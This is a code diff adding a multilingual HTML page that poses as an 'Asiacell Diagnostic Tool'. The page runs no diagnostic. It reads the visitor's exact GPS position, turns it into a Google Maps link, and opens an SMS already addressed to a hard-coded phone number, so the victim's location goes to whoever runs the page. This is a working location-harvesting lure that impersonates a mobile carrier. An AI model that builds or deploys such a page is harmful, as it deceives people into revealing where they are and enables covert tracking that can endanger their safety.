@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Asiacell Location Check</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+      direction: ltr;
+    }
+    h1 {
+      color: #b80000;
+      font-size: 26px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #b80000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 8px;
+    }
+    #loader {
+      display: none;
+      margin-top: 30px;
+    }
+    .circle-loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #b80000;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #success-check {
+      display: none;
+      font-size: 40px;
+      color: green;
+      margin-top: 20px;
+    }
+    #send-button {
+      margin-top: 30px;
+      display: none;
+    }
+    #lang-select {
+      margin-bottom: 20px;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="lang-select">
+    <h3>اللغة | زمان | Language</h3>
+    <button onclick="selectLang('ar')">العربية</button>
+    <button onclick="selectLang('ckb')">کوردیی ناوەڕاست</button>
+    <button onclick="selectLang('en')">English</button>
+  </div>
+
+  <div id="main-content" class="hidden">
+    <h1 id="title"></h1>
+    <p id="instruction"></p>
+    <button id="start-btn" onclick="startLocationCheck()"></button>
+
+    <div id="loader">
+      <div class="circle-loader"></div>
+      <div id="status-message"></div>
+    </div>
+
+    <div id="success-check">✅</div>
+    <button id="send-button"></button>
+  </div>
+
+  <script>
+    let locationResult = "";
+    let currentLang = "en";
+    const isiOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const isAndroid = /Android/i.test(navigator.userAgent);
+
+    const translations = {
+      en: {
+        title: "Asiacell Diagnostic Tool",
+        instruction: "To proceed, please enable your GPS and location permission.",
+        checking: "Checking Location...",
+        startBtn: "🚀 Start Diagnostic",
+        sendBtn: "📩 Send Location",
+        alertPermission: "Please enable location permission in your browser settings.",
+        alertGPS: "Please enable GPS in your device settings.",
+        alertError: "Error accessing location. Please try again.",
+        alertNotAcquired: "Location not acquired yet."
+      },
+      ar: {
+        title: "أداة تشخيص آسياسيل",
+        instruction: "للمتابعة، يرجى تفعيل خدمة الموقع الجغرافي ومنح الإذن للمتصفح.",
+        checking: "جارٍ التحقق من الموقع...",
+        startBtn: "🚀 بدء التشخيص",
+        sendBtn: "📩 إرسال الموقع",
+        alertPermission: "يرجى تفعيل إذن الوصول للموقع من إعدادات المتصفح.",
+        alertGPS: "يرجى تفعيل خدمة الموقع (GPS) من إعدادات الجهاز.",
+        alertError: "حدث خطأ أثناء الوصول إلى الموقع، يرجى المحاولة لاحقاً.",
+        alertNotAcquired: "لم يتم تحديد الموقع بعد."
+      },
+      ckb: {
+        title: "ئامێری پشکنینی ئاسیاسێڵ",
+        instruction: "تکایە GPS و ڕێگەدان بە شوێن دیاری بکە بۆ بەردەوامبوون.",
+        checking: "چاککردنی شوێن...",
+        startBtn: "🚀 دەستپێکردنی پشکنین",
+        sendBtn: "📩 ناردنی شوێن",
+        alertPermission: "تکایە ڕێگە بە شوێن بدە لە ڕێکخستنەکانی وێبگەڕ.",
+        alertGPS: "تکایە GPS چالاک بکە لە ڕێکخستنەکانی ئامێر.",
+        alertError: "هەڵەیەک ڕوویدا لە کاتی وەرگرتنی شوێن، تکایە دووبارە هەوڵ بدە.",
+        alertNotAcquired: "هێشتا شوێن دیاری نەکراوە."
+      }
+    };
+
+    function selectLang(lang) {
+      currentLang = lang;
+      const t = translations[lang];
+      document.getElementById("title").innerText = t.title;
+      document.getElementById("instruction").innerText = t.instruction;
+      document.getElementById("start-btn").innerText = t.startBtn;
+      document.getElementById("send-button").innerText = t.sendBtn;
+      document.getElementById("status-message").innerText = t.checking;
+
+      document.body.style.direction = (lang === "ar" || lang === "ckb") ? "rtl" : "ltr";
+      document.getElementById("lang-select").classList.add("hidden");
+      document.getElementById("main-content").classList.remove("hidden");
+    }
+
+    function startLocationCheck() {
+      const t = translations[currentLang];
+      document.getElementById("loader").style.display = "block";
+      document.getElementById("success-check").style.display = "none";
+      document.getElementById("send-button").style.display = "none";
+
+      if (!navigator.geolocation) {
+        alert(t.alertPermission);
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          locationResult = `https://maps.google.com/?q=${lat},${lon}`;
+
+          document.getElementById("loader").style.display = "none";
+          document.getElementById("success-check").style.display = "block";
+          document.getElementById("send-button").style.display = "inline-block";
+        },
+        (err) => {
+          document.getElementById("loader").style.display = "none";
+          const t = translations[currentLang];
+
+          if (err.code === err.PERMISSION_DENIED) {
+            alert(t.alertPermission);
+          } else if (err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
+            alert(t.alertGPS);
+          } else {
+            alert(t.alertError);
+          }
+
+          setTimeout(() => {
+            location.reload();
+          }, 3000);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000
+        }
+      );
+    }
+
+    document.getElementById("send-button").addEventListener("click", function () {
+      const t = translations[currentLang];
+      if (!locationResult) {
+        alert(t.alertNotAcquired);
+        return;
+      }
+
+      const smsNumber = "+9647701180059";
+      const smsBody = encodeURIComponent(
+        (currentLang === "ar" ? "نتيجة أداة التشخيص:\n" :
+         currentLang === "ckb" ? "ئەنجامی پشکنینی ئاسیاسێڵ:\n" :
+         "Asiacell Diagnostic Result:\n") + locationResult
+      );
+      const smsLink = `sms:${smsNumber}?body=${smsBody}`;
+      window.location.href = smsLink;
+    });
+  </script>
+
+</body>
+</html>
